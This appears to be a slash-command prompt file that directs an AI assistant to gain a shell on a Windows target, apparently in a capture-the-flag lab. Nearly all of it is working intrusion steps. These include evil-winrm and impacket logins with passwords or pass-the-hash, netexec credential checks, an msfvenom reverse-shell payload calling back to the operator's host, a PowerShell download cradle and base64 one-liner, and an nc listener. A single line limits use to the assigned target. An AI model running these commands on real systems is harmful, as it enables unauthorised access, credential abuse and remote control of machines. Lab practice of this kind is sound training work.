---
description: Get an interactive session on a Windows host (once you have creds)
---

Help me get a shell on the Windows target. Args: $ARGUMENTS
Expected: <target-IP> <user> <pass-or-hash>

Pick the right access method based on what the creds allow. Show my tun0 IP as LHOST
for any reverse shell.

## Credentialed remote access (preferred — try in this order)
- WinRM (port 5985): `evil-winrm -i <IP> -u <user> -p <pass>`
  (pass-the-hash: `evil-winrm -i <IP> -u <user> -H <NTLM-hash>`)
- SMB exec (needs admin): `impacket-psexec <DOMAIN>/<user>:<pass>@<IP>`
  quieter alternatives: `impacket-wmiexec`, `impacket-smbexec`, `impacket-atexec`
- Check what a cred can do first: `nxc smb <IP> -u <user> -p <pass>`
  ("Pwn3d!" means local admin → psexec/wmiexec will work)

## RDP (if 3389 open and you want a GUI)
- `xfreerdp /v:<IP> /u:<user> /p:<pass> +clipboard /dynamic-resolution`

## Reverse shells (when you have code exec but no cred login)
- Best option: host Invoke-PowerShell reverse shell and pull it in with a PowerShell
  download-cradle. Generate a payload with:
  `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<tun0> LPORT=<port> -f exe -o shell.exe`
- Serve files to the target: `python3 -m http.server 80`
- Catch it: `rlwrap nc -lvnp <port>` in a separate terminal
- A PowerShell base64 one-liner (`-e`) is often the most reliable single-line option;
  generate it and explain how to run it on the target.

## After landing
- `whoami /priv` and `whoami /groups` — check for exploitable privileges immediately
- Grab the user flag (usually C:\Users\<user>\Desktop\user.txt)
- Then move to /win-privesc

Never run a payload against anything but the assigned target. Explain each step.
